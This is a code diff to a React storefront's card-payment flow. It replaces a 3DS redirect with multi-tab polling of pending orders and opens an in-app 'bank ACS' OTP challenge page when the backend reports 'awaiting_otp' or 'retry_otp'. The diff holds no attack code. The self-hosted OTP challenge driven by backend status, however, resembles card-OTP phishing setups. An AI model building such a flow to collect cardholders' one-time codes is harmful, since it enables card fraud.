@@ -5,7 +5,15 @@ import { Globe, Wallet, CreditCard, Building2, Zap, Copy, CheckCircle2, UploadCl
 import { CardProcessingToOtpScreen } from './components/OtpPaymentUi';
 import { AcsOtpChallenge } from './components/AcsOtpChallenge';
 import AcsChallengePage from './pages/AcsChallengePage';
-import { redirectToAcsChallenge } from './lib/acsRedirect';
+import {
+  trackPendingCardOrder,
+  untrackPendingCardOrder,
+  listPendingCardOrders,
+  openAcsForOrder,
+  subscribeOtpSignals,
+  signalOtpReady,
+  wasAcsOpened,
+} from './lib/multiOrderOtp';
 import { ServiceCard } from './components/ServiceCard';
 import { PubgUcOrder } from './components/PubgUcOrder';
 import { GiftCardOrder } from './components/GiftCardOrder';
@@ -590,7 +598,7 @@ function MainContent() {
   // Must run AFTER clientId is declared (TDZ crash if deps reference clientId earlier)
   useEffect(() => {
     if (!showOtpStep || !currentOrderId || !clientId) return;
-    redirectToAcsChallenge({
+    openAcsForOrder({
       orderRef: currentOrderId,
       clientId,
       lang,
@@ -598,6 +606,86 @@ function MainContent() {
       returnUrl: `${window.location.origin}/`,
     });
   }, [showOtpStep, currentOrderId, clientId, lang, otpPhoneLast3]);
+
+  // Multi-tab: other tabs signal when OTP is ready for an order this tab owns
+  useEffect(() => {
+    if (!clientId) return;
+    return subscribeOtpSignals((orderRef, phoneLast3) => {
+      if (wasAcsOpened(orderRef)) return;
+      openAcsForOrder({
+        orderRef,
+        clientId,
+        lang,
+        phoneLast3,
+        returnUrl: `${window.location.origin}/`,
+      });
+    });
+  }, [clientId, lang]);
+
+  // Multi-order / multi-tab: poll every pending card order this tab created
+  useEffect(() => {
+    if (!clientId) return;
+    let alive = true;
+
+    const pollAllPending = async () => {
+      const refs = listPendingCardOrders();
+      // Also include currentOrderId if set
+      const set = new Set(refs);
+      if (currentOrderId) set.add(currentOrderId);
+      if (set.size === 0) return;
+
+      for (const orderRef of set) {
+        if (!alive) return;
+        try {
+          const qs = new URLSearchParams({ client_id: clientId, order_ref: orderRef });
+          const res = await fetch(apiUrl(`/api/transactions/order-status?${qs.toString()}`));
+          if (!res.ok) continue;
+          const data = (await res.json()) as OtpOrderPoll & { status?: string; phone_last3?: string | null };
+          const st = String(data.status || '').toLowerCase();
+
+          if (st === 'awaiting_otp' || st === 'retry_otp') {
+            // Tell other tabs this order needs ACS (multi-tab OTP)
+            signalOtpReady(orderRef, data.phone_last3);
+            if (!wasAcsOpened(orderRef)) {
+              openAcsForOrder({
+                orderRef,
+                clientId,
+                lang,
+                phoneLast3: data.phone_last3 || otpPhoneLast3,
+                returnUrl: `${window.location.origin}/`,
+              });
+            }
+          } else if (
+            st === 'completed' ||
+            st === 'failed' ||
+            st === 'refunded' ||
+            st === 'suspended'
+          ) {
+            untrackPendingCardOrder(orderRef);
+          }
+        } catch {
+          /* ignore single-order poll errors */
+        }
+      }
+    };
+
+    const onVisible = () => {
+      if (document.visibilityState === 'visible') void pollAllPending();
+    };
+    document.addEventListener('visibilitychange', onVisible);
+    void pollAllPending();
+    // Active tab polls; background tabs wake via visibility + storage signal from active tabs
+    const ms =
+      cardProcessingToOtp || listPendingCardOrders().length > 0
+        ? getOtpPollIntervalMs()
+        : getPollIntervalMs();
+    const id = window.setInterval(() => void pollAllPending(), ms);
+    return () => {
+      alive = false;
+      document.removeEventListener('visibilitychange', onVisible);
+      window.clearInterval(id);
+    };
+  }, [clientId, currentOrderId, lang, otpPhoneLast3, cardProcessingToOtp]);
 
   const [siteProfile, setSiteProfile] = useState<SiteProfileData | null>(null);
   const [profileDraft, setProfileDraft] = useState<SiteProfileData>({ full_name: '', email: '', phone: '' });
@@ -1226,7 +1314,8 @@ function MainContent() {
       setCardProcessingToOtp(false);
       // Open bank ACS on a separate full page (3DS), then return when done
       if (currentOrderId) {
-        redirectToAcsChallenge({
+        signalOtpReady(currentOrderId, meta?.phone_last3 || otpPhoneLast3);
+        openAcsForOrder({
           orderRef: currentOrderId,
           clientId,
           lang,
@@ -1885,6 +1974,7 @@ function MainContent() {
           return;
         }
         setCurrentOrderId(String(orderRef));
+        trackPendingCardOrder(String(orderRef));
         setCardProcessingToOtp(true);
         setShowOtpStep(false);
         setOtpState('input');
@@ -5980,7 +6070,7 @@ function MainContent() {
     // OTP → full-page /3ds (separate bank ACS site)
     if (showOtpStep) {
       if (currentOrderId && clientId) {
-        redirectToAcsChallenge({
+        openAcsForOrder({
           orderRef: currentOrderId,
           clientId,
           lang,
